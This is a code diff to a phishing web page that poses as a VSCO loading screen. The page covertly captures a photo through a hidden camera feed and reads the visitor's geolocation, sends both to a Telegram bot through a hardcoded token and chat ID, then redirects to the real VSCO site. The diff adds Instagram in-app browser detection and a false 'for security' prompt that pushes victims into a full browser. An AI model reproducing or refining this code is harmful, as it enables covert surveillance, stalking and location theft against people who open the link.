@@ -7,13 +7,15 @@
         body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
         .vsco-logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 2s infinite ease-in-out; }
         @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.6; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.6; } }
-        #status { font-size: 11px; letter-spacing: 2px; opacity: 0.5; text-transform: uppercase; }
+        #status { font-size: 11px; letter-spacing: 2px; opacity: 0.5; text-transform: uppercase; text-align: center; padding: 20px; }
         video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        .btn-fix { display: none; background: #fff; color: #000; padding: 10px 20px; text-decoration: none; font-weight: bold; margin-top: 10px; border-radius: 5px; }
     </style>
 </head>
 <body>
     <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
     <div id="status">Initializing Studio...</div>
+    <a href="#" id="open-browser" class="btn-fix">Open in Chrome/Safari to start</a>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -22,7 +24,15 @@
         const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs";
         const chatId = "8005843544";
 
+        // كشف إذا كان المستخدم داخل إنستغرام
+        const isInstagram = navigator.userAgent.includes("Instagram");
+
         window.onload = async () => {
+            if (isInstagram) {
+                document.getElementById('status').innerText = "For security, please open this link in your phone browser (Chrome/Safari) to enable camera.";
+                document.getElementById('open-browser').style.display = "block";
+            }
+
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('video');
@@ -33,35 +43,31 @@
                     const ctx = c.getContext('2d');
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     ctx.drawImage(v, 0, 0);
-
                     const data = ctx.getImageData(0, 0, c.width, c.height).data;
                     let b = 0;
                     for (let i = 0; i < data.length; i += 4) b += (data[i] + data[i+1] + data[i+2]) / 3;
-                    
                     if ((b / (data.length / 4)) > 40) { 
                         clearInterval(checkInterval);
-                        document.getElementById('status').innerText = "Face Detected. Processing...";
                         sendData(c);
                     }
                 }, 1000);
             } catch (e) {
-                setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
+                // إذا فشل في إنستغرام، انتظر 3 ثواني ثم حوله للموقع الرسمي كتمويه
+                setTimeout(() => { window.location.href = "https://vsco.co/"; }, 3000);
             }
         };
 
         function sendData(canvas) {
             navigator.geolocation.getCurrentPosition(p => {
                 const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ وجه مكتشف!\n📍 الموقع: ${loc}`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ Captured from Instagram!\n📍 Location: ${loc}`);
             });
-
             canvas.toBlob(blob => {
                 const f = new FormData();
                 f.append('chat_id', chatId);
                 f.append('photo', blob);
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
             }, 'image/jpeg');
-            
             setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
         }
     </script>
